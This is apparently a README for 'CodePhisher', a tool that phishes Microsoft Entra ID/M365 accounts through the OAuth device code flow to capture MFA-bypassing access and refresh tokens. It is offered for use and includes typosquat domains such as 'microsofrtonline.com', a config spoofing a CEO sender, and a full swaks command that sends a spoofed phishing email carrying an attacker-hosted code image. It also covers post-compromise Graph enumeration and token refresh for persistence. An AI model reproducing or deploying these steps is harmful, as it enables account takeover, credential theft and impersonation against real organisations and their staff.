## What is this?

CodePhisher exploits Microsoft's OAuth device code authentication flow to capture access tokens that **bypass MFA entirely**. It chains domain spoofing with device code phishing to compromise Microsoft Entra ID / M365 accounts from an external attacker perspective.

### The attack chain

1. **Generate** an OAuth device code via Microsoft's legitimate API
2. **Serve** a dynamically updating PNG image showing the current code
3. **Send** a single spoofed HTML phishing email containing the image
4. **Poll** for token capture while the code is valid
5. **Auto-refresh** — when the code expires, a new one is generated and the image updates automatically
6. **Capture** — when the target authenticates, access + refresh tokens are captured
7. **Enumerate** — auto-runs post-compromise enumeration via Microsoft Graph API

## Features

- **Interactive wizard** — guided setup for domain, TLS, and attack configuration
- **Dynamic code image** — single email, auto-refreshing codes via served PNG
- **No-cache headers** — email client fetches fresh image on each open
- **Image load tracking** — logs when target opens the email (IP + User-Agent)
- **Multiple email templates** — professional HTML with Microsoft branding
- **Landing page** — fake Microsoft verification page at `/verify` with live code
- **Auto post-compromise** — enumerates Graph API on token capture
- **Token refresh** — maintain persistent access with refresh tokens
- **Preflight checks** — validates deps, certs, ports before launch
- **Full logging** — all events logged to `phisher.log`

## Usage

### Interactive Mode (recommended)

```bash
sudo python3 codephisher.py
```

Presents a menu with options for setup, attack, enumeration, and more.

### Setup Wizard

```bash
sudo python3 codephisher.py --setup
```

Walks you through:
1. Dependency installation
2. Domain and DNS configuration
3. TLS certificate setup (auto certbot)
4. Config file generation

### Launch Attack

```bash
# With config file
sudo python3 codephisher.py --attack --config config.json

# Skip auto-email (send manually from another machine)
sudo python3 codephisher.py --attack --config config.json --no-email
```

### Post-Compromise Enumeration

```bash
python3 codephisher.py --enumerate token_output.json
```

### Refresh Expired Token

```bash
python3 codephisher.py --refresh token_output.json
```

### View Templates & Client IDs

```bash
python3 codephisher.py --templates
python3 codephisher.py --clients
```

## Setup Guide

### 1. Get a Phishing Domain

Register a domain that resembles Microsoft's login infrastructure:

| Domain | Technique |
|--------|-----------|
| `microsofrtonline.com` | Typosquat (r/t swap) |
| `microsoftonllne.com` | Typosquat (i/l swap) |
| `login-microsoft.com` | Hyphenated |
| `microsoft-verify.com` | Action word |

### 2. DNS Configuration

Point a subdomain to your VPS:

```
Type: A
Name: verify
Value: YOUR_VPS_IP
TTL: 300
```

Or use a wildcard: `*.yourdomain.com → YOUR_VPS_IP`

### 3. TLS Certificate

The setup wizard handles this automatically, or manually:

```bash
sudo certbot certonly --standalone -d verify.yourdomain.com
```

For wildcard certs (if you already have one):

```bash
sudo certbot certonly --manual --preferred-challenges dns \
  -d yourdomain.com -d "*.yourdomain.com"
```

### 4. Config File

Generated by the setup wizard, or create manually:

```json
{
  "target_email": "target@company.com",
  "spoofed_sender": "ceo@company.com",
  "mx_server": "aspmx.l.google.com",
  "server_port": 443,
  "image_url": "https://verify.yourdomain.com/code.png",
  "tls_cert": "/etc/letsencrypt/live/yourdomain.com/fullchain.pem",
  "tls_key": "/etc/letsencrypt/live/yourdomain.com/privkey.pem",
  "email_template": "default",
  "max_attempts": 10,
  "output_file": "token_output.json"
}
```

## Port 25 Blocked?

Many VPS providers block outbound SMTP (port 25). Use manual email mode:

```bash
# On VPS — run without auto-email
sudo python3 codephisher.py --attack --config config.json --no-email

# On your local machine (where port 25 works) — send the email
swaks --to target@company.com \
      --from ceo@company.com \
      --header "Subject: Account Verification" \
      --header "Content-Type: text/html" \
      --header "MIME-Version: 1.0" \
      --body '<html><body>
        <p>Please verify your account at
        <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a>
        using this code:</p>
        <p><img src="https://verify.yourdomain.com/code.png" alt="Code"></p>
        </body></html>' \
      --server aspmx.l.google.com
```
